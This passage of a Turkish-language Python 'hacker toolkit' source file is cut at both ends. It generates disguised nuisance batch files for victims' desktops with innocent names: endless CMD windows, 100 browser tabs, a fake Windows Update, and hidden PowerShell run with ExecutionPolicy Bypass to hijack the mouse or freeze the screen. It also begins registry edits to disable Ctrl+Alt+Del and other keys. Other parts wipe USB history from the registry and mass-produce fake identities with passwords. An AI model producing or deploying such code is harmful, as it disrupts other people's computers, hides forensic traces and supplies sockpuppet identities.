            enc=fkey.encrypt(data)
            out=path+".enc"
            open(out,"wb").write(enc)
            success(f"Sifrelendi: {out}")
            if confirm("Orijinal dosya silinsin mi?"):
                secure_delete(path)
                success("Orijinal guvenlice silindi.")
        except Exception as e: error(str(e))
    elif s=="2":
        spin("Cozuluyor",1.0)
        try:
            data=open(path,"rb").read()
            dec=fkey.decrypt(data)
            out=path.replace(".enc","") if path.endswith(".enc") else path+"_cozuldu"
            open(out,"wb").write(dec)
            success(f"Cozuldu: {out}")
        except Exception as e: error(f"Yanlis sifre veya bozuk dosya. {e}")
    pause()

# ════════════════════════════════════════════════
#  13. GÜVENLİ SİL
# ════════════════════════════════════════════════
def secure_delete(path,passes=3):
    if not os.path.isfile(path): return False
    try:
        size=os.path.getsize(path)
        with open(path,"r+b") as f:
            for _ in range(passes):
                f.seek(0)
                f.write(os.urandom(size))
                f.flush(); os.fsync(f.fileno())
        os.remove(path)
        return True
    except: return False

def menu_secure_delete():
    banner("GUVENLI SIL","Uzerine yaz, kurtarilmasin")
    warn("Bu islem geri alinamaz! Dosya kalici olarak silinir.")
    print(f"\n  {GREEN}Dosya yolu:{R}  ",end=""); path=input().strip().strip('"')
    if not os.path.isfile(path): error("Dosya bulunamadi."); pause(); return
    size=os.path.getsize(path)
    lv("  Dosya",os.path.basename(path),lc=CYAN,vc=YELLOW)
    lv("  Boyut",f"{round(size/1024,1)} KB",lc=DCYAN)
    if not confirm("Kalici olarak silinsin mi?"):
        warn("Iptal."); pause(); return
    pbar("Uzerine yaziliyor (3 tur)...",15,RED)
    if secure_delete(path):
        success("Dosya guvenlice silindi. Kurtarilmasi imkansiz.")
    else:
        error("Silme islemi basarisiz.")
    pause()

# ════════════════════════════════════════════════
#  14. ŞİFRE ÜRETİCİ
# ════════════════════════════════════════════════
CHARSETS={
    "1":("harf+rakam+sembol", string.ascii_letters+string.digits+"!@#$%^&*()-_=+[]{}|;:,.<>?"),
    "2":("harf+rakam",        string.ascii_letters+string.digits),
    "3":("sadece rakam",      string.digits),
    "4":("hex",               string.hexdigits[:16]),
}

def pw_strength(pw):
    s=sum([any(c.isupper() for c in pw),any(c.islower() for c in pw),
           any(c.isdigit() for c in pw),any(c in "!@#$%^&*()-_=+[]{}|;:,.<>?" for c in pw),
           len(pw)>=16])
    if s>=5: return GREEN,"GUCLU  "
    elif s>=3: return YELLOW,"ORTA   "
    else: return RED,"ZAYIF  "

# ════════════════════════════════════════════════
#  15. SAHTE KİMLİK ÜRETİCİ
# ════════════════════════════════════════════════
ISIMLER_E = ["Ahmet","Mehmet","Ali","Mustafa","Hasan","Huseyin","Ibrahim","Ismail",
             "Omer","Yusuf","Emre","Burak","Serkan","Murat","Enes","Oguz","Furkan",
             "Berk","Kerem","Tolga","Selim","Tarık","Deniz","Kaan","Eren","Onur",
             "Batuhan","Umut","Alp","Caner","Doruk","Ege","Fırat","Gokhan","Haluk"]
ISIMLER_K = ["Fatma","Ayse","Emine","Hatice","Zeynep","Elif","Merve","Selin","Busra",
             "Ozge","Ceren","Esra","Tugce","Dilara","Melisa","Irem","Sude","Yaren",
             "Buse","Damla","Ece","Gizem","Havva","Ilknur","Kubra","Leman","Nisa"]
SOYADLAR  = ["Yilmaz","Kaya","Demir","Sahin","Celik","Yildiz","Yildirim","Ozturk",
             "Aydin","Ozdemir","Arslan","Dogan","Kilic","Aslan","Koc","Kurt","Ozkan",
             "Simsek","Polat","Kaplan","Bozkurt","Erdogan","Gultekin","Akcay","Bulut",
             "Karaca","Tekin","Unal","Guler","Cakir","Erdem","Bayram","Topcu","Acar"]
SEHIRLER  = ["Istanbul","Ankara","Izmir","Bursa","Antalya","Adana","Konya","Gaziantep",
             "Mersin","Kayseri","Eskisehir","Trabzon","Samsun","Malatya","Diyarbakir"]
EMAIL_DOM = ["gmail.com","yahoo.com","hotmail.com","outlook.com","protonmail.com",
             "yandex.com","icloud.com","tutanota.com"]
OPERATORLER = [("0532","532"),("0533","533"),("0535","535"),("0537","537"),
               ("0538","538"),("0541","541"),("0542","542"),("0543","543"),
               ("0544","544"),("0545","545"),("0546","546"),("0551","551"),
               ("0552","552"),("0553","553"),("0554","554"),("0555","555")]

def uret_kimlik():
    cinsiyet = random.choice(["E","K"])
    ad = random.choice(ISIMLER_E if cinsiyet=="E" else ISIMLER_K)
    soyad = random.choice(SOYADLAR)
    ad_lower = ad.lower().replace("ı","i").replace("ğ","g").replace("ş","s").replace("ç","c").replace("ö","o").replace("ü","u")
    soyad_lower = soyad.lower().replace("ı","i").replace("ğ","g").replace("ş","s").replace("ç","c").replace("ö","o").replace("ü","u")
    yil = random.randint(1975, 2003)
    ay  = random.randint(1, 12)
    gun = random.randint(1, 28)
    dogum = f"{gun:02d}.{ay:02d}.{yil}"
    sayi = random.randint(1, 999)
    sep  = random.choice([".","-","_",""])
    email_user = f"{ad_lower}{sep}{soyad_lower}{sayi}"
    email = f"{email_user}@{random.choice(EMAIL_DOM)}"
    username = f"{ad_lower}_{soyad_lower}{random.randint(10,99)}"
    op,op_clean = random.choice(OPERATORLER)
    telefon = f"+90 {op_clean} {random.randint(100,999)} {random.randint(10,99)} {random.randint(10,99)}"
    sehir = random.choice(SEHIRLER)
    pw_chars = string.ascii_letters+string.digits+"!@#$%"
    sifre = ''.join(random.choices(pw_chars, k=12))
    return {
        "Ad Soyad":     f"{ad} {soyad}",
        "Cinsiyet":     "Erkek" if cinsiyet=="E" else "Kadin",
        "Dogum Tarihi": dogum,
        "Sehir":        sehir,
        "E-posta":      email,
        "Kullanici":    username,
        "Telefon":      telefon,
        "Sifre":        sifre,
    }

def menu_sahte_kimlik():
    banner("SAHTE KIMLIK URETICI","Rastgele kisilik uret")
    print(f"  {GREEN}Kac kimlik? (1-1000, varsayilan 200):{R}  ", end="")
    raw = input().strip()
    count = int(raw) if raw.isdigit() and 1 <= int(raw) <= 1000 else 200
    print()
    pbar("Kimlikler uretiliyor...", min(count, 30), GREEN)
    kimlikler = [uret_kimlik() for _ in range(count)]
    print(); thick()
    print(f"  {BOLD}{GREEN}{'#':<6}{'AD SOYAD':<22}{'E-POSTA':<36}{'TELEFON'}{R}")
    divider()
    for i, k in enumerate(kimlikler, 1):
        nc = DGREEN if i % 2 == 0 else GREEN
        print(f"  {nc}{i:<6}{R}{WHITE}{k['Ad Soyad']:<22}{R}{DGREEN}{k['E-posta']:<36}{R}{GREEN}{k['Telefon']}{R}")
        if count > 200 and i % 50 == 0:
            time.sleep(0.01)
        else:
            time.sleep(0.003)
    thick()
    success(f"{count} sahte kimlik uretildi.")
    if confirm("Detayli liste .txt dosyasina kaydedilsin mi?"):
        fname = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             f"kimlikler_{int(time.time())}.txt")
        with open(fname, "w", encoding="utf-8") as f:
            f.write(f"SOLDATEN - Sahte Kimlik Listesi\n{'='*60}\n\n")
            for i, k in enumerate(kimlikler, 1):
                f.write(f"{'─'*50}\n#{i}\n")
                for key, val in k.items():
                    f.write(f"  {key:<16}: {val}\n")
                f.write("\n")
        success(f"Kaydedildi: {fname}")
    pause()

# ════════════════════════════════════════════════
#  16. IP SORGULA
# ════════════════════════════════════════════════
def menu_ip_sorgu():
    banner("IP SORGULA","Bir IP hakkinda her seyi oren")
    print(f"  {GREEN}Sorgulanacak IP (bos birakırsan kendi IP'n):{R}  ", end="")
    target = input().strip()

    if not target:
        spin("Kendi IP'n aliniyor", 1.0)
        target = get_ip()
        info(f"Kendi IP'n: {target}")

    spin(f"{target} sorgulanıyor", 1.5)

    try:
        # Ana bilgi
        r = requests.get(f"http://ip-api.com/json/{target}?fields=66846719", timeout=10).json()
        # Ek tehdit bilgisi
        abuse = {}
        try:
            abuse = requests.get(
                f"https://api.abuseipdb.com/api/v2/check",
                headers={"Key": "demo", "Accept": "application/json"},
                params={"ipAddress": target, "maxAgeInDays": 90},
                timeout=5
            ).json().get("data", {})
        except: pass

        print(); thick()

        # Temel bilgi
        status_color = GREEN if r.get("status") == "success" else RED
        lv("  IP",           target,                                    lc=CYAN,  vc=YELLOW)
        lv("  Ulke",         f"{r.get('country','?')} ({r.get('countryCode','?')})", lc=DCYAN)
        lv("  Bolge",        f"{r.get('regionName','?')}, {r.get('city','?')}",      lc=DCYAN)
        lv("  Koordinat",    f"{r.get('lat','?')}, {r.get('lon','?')}",              lc=DCYAN, vc=GRAY)
        lv("  Timezone",     r.get("timezone","?"),                     lc=DCYAN, vc=GRAY)
        divider()
        lv("  ISP",          r.get("isp","?"),                          lc=MAG)
        lv("  Org",          r.get("org","?"),                          lc=MAG,   vc=GRAY)
        lv("  AS",           r.get("as","?"),                           lc=MAG,   vc=GRAY)
        divider()

        # Proxy / VPN / Hosting
        is_proxy   = r.get("proxy", False)
        is_hosting = r.get("hosting", False)
        is_mobile  = r.get("mobile", False)

        proxy_col   = RED   if is_proxy   else GREEN
        hosting_col = RED   if is_hosting else GREEN
        mobile_col  = YELLOW if is_mobile  else GREEN

        lv("  Proxy / VPN",  "EVET ⚠" if is_proxy   else "Hayir",  lc=proxy_col,   vc=proxy_col)
        lv("  Hosting/Bot",  "EVET ⚠" if is_hosting else "Hayir",  lc=hosting_col, vc=hosting_col)
        lv("  Mobil",        "Evet"   if is_mobile   else "Hayir",  lc=mobile_col,  vc=mobile_col)

        # Tehdit skoru
        if abuse:
            score = abuse.get("abuseConfidenceScore", 0)
            reports = abuse.get("totalReports", 0)
            score_col = RED if score > 50 else YELLOW if score > 10 else GREEN
            divider()
            lv("  Tehdit Skoru", f"%{score}",   lc=score_col, vc=score_col)
            lv("  Kotu Rapor",   str(reports),  lc=score_col, vc=score_col)

        thick()

        # Yorum
        if is_proxy and is_hosting:
            warn("Bu IP bir VPN/Proxy sunucusu. Gercek konum farkli olabilir.")
        elif is_hosting:
            warn("Bu IP bir hosting/veri merkezi. Bot veya otomasyon olabilir.")
        elif is_proxy:
            warn("Bu IP proxy olarak isaretlenmis.")
        else:
            success("Bu IP temiz gorunuyor.")

    except Exception as e:
        error(f"Sorgu basarisiz: {e}")
    pause()

def menu_password():
    banner("SIFRE URETICI","Guclu rastgele sifreler")
    for k,(name,_) in CHARSETS.items():
        print(f"  {GREEN}[{k}]{R}  {name}")
    print(f"\n  {GREEN}Karakter seti (varsayilan 1):{R}  ",end="")
    cs=input().strip(); cs=cs if cs in CHARSETS else "1"
    cs_name,chars=CHARSETS[cs]
    print(f"  {GREEN}Uzunluk (8-64, varsayilan 18):{R}  ",end="")
    raw=input().strip(); length=int(raw) if raw.isdigit() and 8<=int(raw)<=64 else 18
    print(f"  {GREEN}Adet (10-200, varsayilan 100):{R}  ",end="")
    raw=input().strip(); count=int(raw) if raw.isdigit() and 10<=int(raw)<=200 else 100
    print(); pbar("Sifreler uretiliyor...",20,MAG)
    pws=[''.join(random.choices(chars,k=length)) for _ in range(count)]
    print(); thick()
    print(f"  {BOLD}{MAG}{'#':<6}{'SIFRE':<{length+4}}{'GUC'}{R}"); divider(MAG)
    for i,pw in enumerate(pws,1):
        col,lbl=pw_strength(pw)
        nc=GRAY if i%2==0 else DCYAN
        print(f"  {nc}{i:<6}{R}{BOLD}{col}{pw:<{length+4}}{R}{DIM}{col}[{lbl}]{R}")
        time.sleep(0.01)
    thick()
    success(f"{count} sifre uretildi  |  Uzunluk: {length}  |  Set: {cs_name}")
    if confirm("Bir .txt dosyasina kaydedilsin mi?"):
        fname=os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           f"sifreler_{int(time.time())}.txt")
        with open(fname,"w",encoding="utf-8") as f:
            f.write(f"SOLDATEN Sifre Listesi\n{'='*40}\n{cs_name} | Uzunluk:{length} | Adet:{count}\n{'='*40}\n\n")
            for i,pw in enumerate(pws,1): f.write(f"{i:>4}.  {pw}\n")
        success(f"Kaydedildi: {fname}")
    pause()


# ════════════════════════════════════════════════
#  17. USB GEÇMİŞİ TEMİZLE
# ════════════════════════════════════════════════
def menu_usb_temizle():
    if not IS_WINDOWS:
        error("Bu ozellik sadece Windows'ta calisir."); pause(); return
    print(f"  {GREEN}[1]{R}  {BOLD}{GREEN}USB Kayit Listesi Goster{R}    {DGREEN}Hangi USB'ler takilmis{R}")
    print(f"  {GREEN}[2]{R}  {BOLD}{GREEN}USB Gecmisini Temizle{R}       {DGREEN}Registry kayitlarini sil{R}")
    print(f"  {RED}[0]{R}  {RED}Geri{R}")
    print(f"\n  {GREEN}Secim:{R}  ", end=""); s = input().strip()

    if s == "1":
        banner("USB KAYIT LISTESI", "Daha once takilmis aygitlar")
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Enum\USBSTOR")
            print(f"\n  {BOLD}{GREEN}{'AYGIT':<50}{'DURUM'}{R}")
            divider()
            count = 0
            try:
                i = 0
                while True:
                    subkey_name = winreg.EnumKey(key, i)
                    subkey = winreg.OpenKey(key, subkey_name)
                    try:
                        j = 0
                        while True:
                            instance = winreg.EnumKey(subkey, j)
                            inst_key = winreg.OpenKey(subkey, instance)
                            try:
                                friendly, _ = winreg.QueryValueEx(inst_key, "FriendlyName")
                            except:
                                friendly = subkey_name[:48]
                            print(f"  {GREEN}{friendly[:50]:<50}{R}  {DGREEN}Kayitli{R}")
                            count += 1
                            winreg.CloseKey(inst_key)
                            j += 1
                    except OSError:
                        pass
                    winreg.CloseKey(subkey)
                    i += 1
            except OSError:
                pass
            winreg.CloseKey(key)
            thick()
            if count == 0:
                info("Kayitli USB aygiti bulunamadi.")
            else:
                success(f"{count} USB kaydi listelendi.")
        except Exception as e:
            error(f"Registry okuma hatasi: {e}")
        pause()

    elif s == "2":
        if not confirm("USB gecmisi silinsin mi? (Geri alinamaz)"):
            return
        spin("USB kayitlari temizleniyor", 2)
        deleted = 0
        errors  = 0
        # USBSTOR - takilan USB depolama aygitlari
        reg_paths = [
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Enum\USBSTOR"),
            (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Enum\USB"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\EMDMgmt"),
        ]
        for hive, path in reg_paths:
            try:
                key = winreg.OpenKey(hive, path, 0, winreg.KEY_ALL_ACCESS)
                subkeys = []
                try:
                    idx = 0
                    while True:
                        subkeys.append(winreg.EnumKey(key, idx)); idx += 1
                except OSError:
                    pass
                for sk in subkeys:
                    try:
                        winreg.DeleteKey(key, sk); deleted += 1
                    except:
                        errors += 1
                winreg.CloseKey(key)
            except:
                errors += 1
        # MountedDevices - surucu harfleri eslesmesi
        try:
            md_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                r"SYSTEM\MountedDevices", 0, winreg.KEY_ALL_ACCESS)
            vals = []
            try:
                idx = 0
                while True:
                    vals.append(winreg.EnumValue(md_key, idx)[0]); idx += 1
            except OSError:
                pass
            for v in vals:
                if "USB" in v.upper() or "Harddisk" in v:
                    try:
                        winreg.DeleteValue(md_key, v); deleted += 1
                    except:
                        pass
            winreg.CloseKey(md_key)
        except:
            pass
        thick()
        success(f"USB gecmisi temizlendi. ({deleted} kayit silindi)")
        if errors:
            warn(f"{errors} kayit silinemedi (yonetici yetkisi gerekebilir).")
        pause()


# ════════════════════════════════════════════════
#  18. ŞAKA BAT ÜRETİCİ
# ════════════════════════════════════════════════
def _bat_yaz(dosya_adi, icerik, aciklama):
    """BAT dosyasini masaustune yazar."""
    masaustu = os.path.join(os.path.expanduser("~"), "Desktop")
    hedef    = os.path.join(masaustu, dosya_adi)
    try:
        with open(hedef, "w", encoding="utf-8") as f:
            f.write(icerik)
        success(f"'{dosya_adi}' masaustune olusturuldu!")
        info(aciklama)
    except Exception as e:
        error(f"Dosya olusturulamadi: {e}")

def menu_saka_bat():
    if not IS_WINDOWS:
        error("Bu ozellik sadece Windows'ta calisir."); pause(); return
    print(f"  {DGREEN}Not: Dosyalar masaustunuze olusturulur, calıstirmak size kalmis.{R}\n")
    print(f"  {GREEN}[1]{R}  {BOLD}{GREEN}Tarayici Bombasi{R}           {DGREEN}100 sekme birden acar{R}")
    print(f"  {GREEN}[2]{R}  {BOLD}{GREEN}Sonsuz CMD{R}                 {DGREEN}Her kapananda yeni CMD acar{R}")
    print(f"  {GREEN}[3]{R}  {BOLD}{GREEN}Sahte Windows Update{R}       {DGREEN}Guncelleme yukleniyor taklidi{R}")
    print(f"  {GREEN}[4]{R}  {BOLD}{GREEN}Fare Delirtici{R}             {DGREEN}Fareyi rastgele hareket ettirir{R}")
    print(f"  {GREEN}[5]{R}  {BOLD}{GREEN}Ses Bombasi{R}                {DGREEN}Sesi surekli ac/kapat dongusu{R}")
    print(f"  {GREEN}[6]{R}  {BOLD}{GREEN}Ekran Dondurucu{R}            {DGREEN}Masaustu donmus gibi gorunur{R}")
    print(f"  {GREEN}[7]{R}  {BOLD}{GREEN}Hepsini Olustur{R}            {DGREEN}Tum sakalari tek seferde yaz{R}")
    print(f"  {RED}[0]{R}  {RED}Geri{R}")
    print(f"\n  {GREEN}Secim:{R}  ", end=""); s = input().strip()

    if s == "0":
        return

    sakalar = {
        "1": ("sistem_bilgi.bat",
              "@echo off\n" +
              "".join(f'start "" "https://www.youtube.com/results?search_query=video{i}"\n' for i in range(100)),
              "Calistirildiginda 100 tarayici sekmesi acar."),

        "2": ("disk_temizle.bat",
              "@echo off\n"
              "title Disk Temizleme Araci\n"
              ":loop\n"
              "start cmd /k \"color 0A & echo Disk analizi yapiliyor... & timeout /t 999 >nul\"\n"
              "timeout /t 1 >nul\n"
              "goto loop\n",
              "Her saniye yeni bir CMD penceresi acar. Gorevi sonlandirarak durdur."),

        "3": ("windows_guncelle.bat",
              "@echo off\n"
              "title Windows Update\n"
              "color 0B\n"
              ":loop\n"
              "cls\n"
              "echo.\n"
              "echo  Windows Update\n"
              "echo  ================================\n"
              "echo.\n"
              "echo  Guncellemeler yukleniyor, lutfen bekleyin...\n"
              "echo.\n"
              "for /L %%i in (1,1,99) do (\n"
              "    cls\n"
              "    echo.\n"
              "    echo  Windows Update - Guncelleme Yukleniyor\n"
              "    echo  ========================================\n"
              "    echo.\n"
              "    echo  Ilerleme: %%i%%\n"
              "    echo.\n"
              "    echo  Lutfen bilgisayarinizi kapatmayin...\n"
              "    timeout /t 1 >nul\n"
              ")\n"
              "echo  Guncelleme tamamlandi! Yeniden baslatiliyor...\n"
              "timeout /t 3 >nul\n"
              "goto loop\n",
              "Sahte Windows guncelleme ekrani, kapatana kadar devam eder."),

        "4": ("agbag_tani.bat",
              "@echo off\n"
              "title Ag Baglanti Testi\n"
              "set PS=%TEMP%\\mscfg.ps1\n"
              "(\n"
              "echo Add-Type -AssemblyName System.Windows.Forms\n"
              "echo Add-Type -AssemblyName System.Drawing\n"
              "echo $end = (Get-Date^).AddMinutes(3^)\n"
              "echo while ((Get-Date^) -lt $end^) {\n"
              "echo     $w = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width\n"
              "echo     $h = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height\n"
              "echo     $x = Get-Random -Minimum 0 -Maximum $w\n"
              "echo     $y = Get-Random -Minimum 0 -Maximum $h\n"
              "echo     [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x,$y^)\n"
              "echo     Start-Sleep -Milliseconds 150\n"
              "echo }\n"
              ") > \"%PS%\"\n"
              "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%PS%\"\n"
              "del \"%PS%\" >nul 2>&1\n",
              "3 dakika fareyi rastgele hareket ettirir, penceresi gizlenir."),

        "5": ("ses_ayar.bat",
              "@echo off\n"
              "title Ses Ayarlari\n"
              ":loop\n"
              "powershell -c \"$wsh=New-Object -com WScript.Shell; 1..5 | ForEach-Object { $wsh.SendKeys([char]174); Start-Sleep -m 100 }\"\n"
              "timeout /t 1 >nul\n"
              "powershell -c \"$wsh=New-Object -com WScript.Shell; 1..10 | ForEach-Object { $wsh.SendKeys([char]175); Start-Sleep -m 100 }\"\n"
              "timeout /t 2 >nul\n"
              "powershell -c \"$wsh=New-Object -com WScript.Shell; 1..8 | ForEach-Object { $wsh.SendKeys([char]174); Start-Sleep -m 100 }\"\n"
              "timeout /t 2 >nul\n"
              "goto loop\n",
              "Sesi surekli yukselitip alcaltir. Gorev yoneticisinden kapat."),

        "6": ("ekran_koruyucu.bat",
              "@echo off\n"
              "title Ekran Koruyucu\n"
              "set PS=%TEMP%\\escfg.ps1\n"
              "(\n"
              "echo Add-Type -AssemblyName System.Windows.Forms\n"
              "echo Add-Type -AssemblyName System.Drawing\n"
              "echo $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds\n"
              "echo $bmp = New-Object System.Drawing.Bitmap($screen.Width,$screen.Height^)\n"
              "echo $gr = [System.Drawing.Graphics]::FromImage($bmp^)\n"
              "echo $gr.CopyFromScreen($screen.Location,[System.Drawing.Point]::Empty,$screen.Size^)\n"
              "echo $tmp = [System.IO.Path]::GetTempFileName(^) + '.bmp'\n"
              "echo $bmp.Save($tmp^)\n"
              "echo Add-Type @'\n"
              "echo using System; using System.Runtime.InteropServices;\n"
              "echo public class W { [DllImport(\"user32.dll\")] public static extern bool SystemParametersInfo(int a,int b,string c,int d); }\n"
              "echo '@\n"
              "echo [W]::SystemParametersInfo(20,0,$tmp,3^)\n"
              "echo Start-Sleep -Seconds 30\n"
              "echo [W]::SystemParametersInfo(20,0,'',3^)\n"
              "echo Remove-Item $tmp -Force\n"
              ") > \"%PS%\"\n"
              "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%PS%\"\n"
              "del \"%PS%\" >nul 2>&1\n",
              "Ekrani 30 sn dondurulmus gibi gosterir, otomatik normale doner."),
    }

    secilen = {}
    if s == "7":
        secilen = {k: v for k, v in sakalar.items()}
    elif s in sakalar:
        secilen[s] = sakalar[s]
    else:
        warn("Gecersiz secim."); time.sleep(0.8); return

    spin("BAT dosyalari olusturuluyor", 1.5)
    for _, (dosya, icerik, aciklama) in secilen.items():
        _bat_yaz(dosya, icerik, aciklama)

    pause()



# ════════════════════════════════════════════════
#  19. MATRİX EKRANI
# ════════════════════════════════════════════════
def menu_matrix():
    banner("MATRIX EKRANI", "Cıkmak icin CTRL+C")
    time.sleep(0.5)
    import shutil
    cols = shutil.get_terminal_size().columns
    chars = "ｦｧｨｩｪｫｬｭｮｯｰｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜﾝ0123456789ABCDEF"
    # Her sütun için düşme pozisyonu ve hız
    drops   = [random.randint(0, 30) for _ in range(cols)]
    speeds  = [random.randint(1, 3)  for _ in range(cols)]
    counter = 0
    BRIGHT  = "\033[92m"   # parlak yeşil — öndeki karakter
    DIM_G   = "\033[32m"   # koyu yeşil   — iz
    FADE    = "\033[90m"   # gri           — solma
    clear()
    try:
        while True:
            line = ""
            for c in range(cols):
                if drops[c] == 0:
                    line += f"{BRIGHT}{random.choice(chars)}{R}"
                elif drops[c] < 4:
                    line += f"{DIM_G}{random.choice(chars)}{R}"
                elif drops[c] < 8:
                    line += f"{FADE}{random.choice(chars)}{R}"
                else:
                    line += " "
                drops[c] = (drops[c] + speeds[c]) % random.randint(20, 40)
            sys.stdout.write(line + "\n")
            sys.stdout.flush()
            time.sleep(0.04)
            counter += 1
            # Belirli aralarla ekranı temizle ki terminal taşmasın
            if counter % 35 == 0:
                clear()
    except KeyboardInterrupt:
        clear()
        success("Matrix kapatildi.")
        pause()


# ════════════════════════════════════════════════
#  20. SAHTE HATA MESAJI
# ════════════════════════════════════════════════
def menu_sahte_hata():
    banner("SAHTE HATA MESAJI", "Dramatik sistem hatasi sahnesi")
    print(f"  {GREEN}[1]{R}  {BOLD}{GREEN}BSOD Taklidi{R}              {DGREEN}Mavi ekran mesajı{R}")
    print(f"  {GREEN}[2]{R}  {BOLD}{GREEN}Kritik Sistem Hatasi{R}      {DGREEN}Dramatik cokme animasyonu{R}")
    print(f"  {GREEN}[3]{R}  {BOLD}{GREEN}Hack Sahne{R}                {DGREEN}Bilgisayar hackleniyormus taklidi{R}")
    print(f"  {RED}[0]{R}  {RED}Geri{R}")
    print(f"\n  {GREEN}Secim:{R}  ", end=""); s = input().strip()

    if s == "0":
        return

    elif s == "1":
        # BSOD taklidi — terminal versiyonu
        clear()
        BLUE_BG = "\033[44m"
        print(f"{BLUE_BG}{WHITE}")
        print(" " * 80 * 3)
        lines = [
            "",
            "          :(",
            "",
            "  Bilgisayariniz bir sorunla karsilasti ve yeniden baslatilmasi gerekiyor.",
            "  Bu hatanin olusmasina neden olan bilgileri topluyoruz,",
            "  islem tamamlandiginda yeniden baslatilacak.",
            "",
        ]
        for l in lines:
            print(f"{BLUE_BG}{WHITE}{l:<80}{R}")
        # ilerleme animasyonu
        for pct in range(0, 101, 2):
            sys.stdout.write(f"\r{BLUE_BG}{WHITE}  % {pct} tamamlandi    {R}")
            sys.stdout.flush()
            time.sleep(0.07)
        print(f"\n{BLUE_BG}{WHITE}")
        print(f"{BLUE_BG}{WHITE}  Hata kodu: CRITICAL_PROCESS_DIED (0x000000EF){'':35}{R}")
        print(f"{BLUE_BG}{WHITE}  https://www.windows.com/stopcode{'':47}{R}")
        print(f"{BLUE_BG}{WHITE}{' ' * 80}{R}")
        time.sleep(3)
        clear()
        success("BSOD sahnesi tamamlandi.")
        pause()

    elif s == "2":
        # Kritik hata animasyonu
        clear()
        hatalar = [
            "CRITICAL ERROR: Memory allocation failed at 0x7FFE0300",
            "FATAL: Kernel stack overflow detected",
            "ERROR: System32\\drivers\\ntfs.sys corrupted",
            "WARNING: CPU temperature critical — 104°C",
            "FATAL: Registry hive SYSTEM unreadable",
            "ERROR: Disk I/O failure on drive C:\\",
            "CRITICAL: LSASS.exe terminated unexpectedly",
            "FATAL: Boot sector integrity check failed",
            "ERROR: ntdll.dll — Access violation at 0x00000000",
            "CRITICAL: System halted. Data loss imminent.",
        ]
        RED_B = "\033[91m"
        for h in hatalar:
            print(f"  {RED_B}[HATA]{R} {WHITE}{h}{R}")
            time.sleep(0.4)
        time.sleep(0.5)
        print(f"\n  {RED_B}{'█'*60}{R}")
        typewrite("  SISTEM COKUYOR... TUM VERILER SILINIYOR...", delay=0.04, color=RED_B)
        for i in range(10, 0, -1):
            sys.stdout.write(f"\r  {RED_B}Yeniden baslatiliyor: {i} saniye...{R}  ")
            sys.stdout.flush()
            time.sleep(1)
        clear()
        success("Sahte hata sahnesi tamamlandi.")
        pause()

    elif s == "3":
        # Hack sahnesi
        clear()
        hedef = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
        print(f"  {GREEN}[*] Hedef tespit edildi: {hedef}{R}"); time.sleep(0.5)
        print(f"  {GREEN}[*] Port tarama baslatiliyor...{R}"); time.sleep(0.8)
        for port in [21, 22, 80, 443, 3306, 8080]:
            durum = random.choice(["ACIK", "ACIK", "KAPALI"])
            col = GREEN if durum == "ACIK" else DGREEN
            print(f"  {col}    Port {port:<6} {durum}{R}")
            time.sleep(0.3)
        print(f"\n  {GREEN}[*] Guvenlik acigi bulundu: CVE-2024-{random.randint(1000,9999)}{R}"); time.sleep(0.7)
        print(f"  {GREEN}[*] Exploit yukleniyor...{R}")
        pbar("", 25, GREEN)
        print(f"  {GREEN}[+] Erisim saglandi!{R}"); time.sleep(0.5)
        print(f"  {GREEN}[*] Dosyalar kopyalaniyor...{R}")
        dosyalar = ["passwords.txt", "wallet.dat", "documents.zip", "credit_cards.csv"]
        for d in dosyalar:
            size = random.randint(10, 999)
            print(f"  {DGREEN}    {d:<25} {size} KB kopyalandi{R}")
            time.sleep(0.4)
        print(f"\n  {GREEN}[+] Islem tamamlandi. Izler siliniyor...{R}"); time.sleep(1)
        clear()
        success("Hack sahnesi tamamlandi.")
        pause()

    else:
        warn("Gecersiz secim."); time.sleep(0.8)


# ════════════════════════════════════════════════
#  21. KLAVYE KİTLEME BAT
# ════════════════════════════════════════════════
def menu_klavye_kilitle():
    if not IS_WINDOWS:
        error("Bu ozellik sadece Windows'ta calisir."); pause(); return
    print(f"  {DGREEN}Not: Masaustune .bat olusturulur. Calıstırinca tuslar kitlenir.{R}")
    print(f"  {DGREEN}      Kilidi kaldırmak icin ayni .bat'i tekrar calistirin.{R}\n")
    print(f"  {GREEN}[1]{R}  {BOLD}{GREEN}Win Tusu Kilitle{R}          {DGREEN}Start menusunu devre disi birak{R}")
    print(f"  {GREEN}[2]{R}  {BOLD}{GREEN}Alt+F4 Kilitle{R}            {DGREEN}Pencere kapatmayi engelle{R}")
    print(f"  {GREEN}[3]{R}  {BOLD}{GREEN}Ctrl+Alt+Del Kilitle{R}      {DGREEN}Gorev yoneticisini engelle{R}")
    print(f"  {GREEN}[4]{R}  {BOLD}{GREEN}Tum Ozel Tuslar Kilitle{R}   {DGREEN}Win + Alt+F4 + Ctrl+Alt+Del{R}")
    print(f"  {GREEN}[5]{R}  {BOLD}{GREEN}Kilit Kaldir BAT{R}          {DGREEN}Her seyi normale dondur{R}")
    print(f"  {RED}[0]{R}  {RED}Geri{R}")
    print(f"\n  {GREEN}Secim:{R}  ", end=""); s = input().strip()

    if s == "0":
        return

    masaustu = os.path.join(os.path.expanduser("~"), "Desktop")

    # PowerShell ile registry üzerinden tus kilitleme
    bat_icerik = {
        "1": ("win_tus_ayar.bat",
              "@echo off\n"
              "title Sistem Ayari\n"
              "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoWinKeys >nul 2>&1\n"
              "if %errorlevel%==0 (\n"
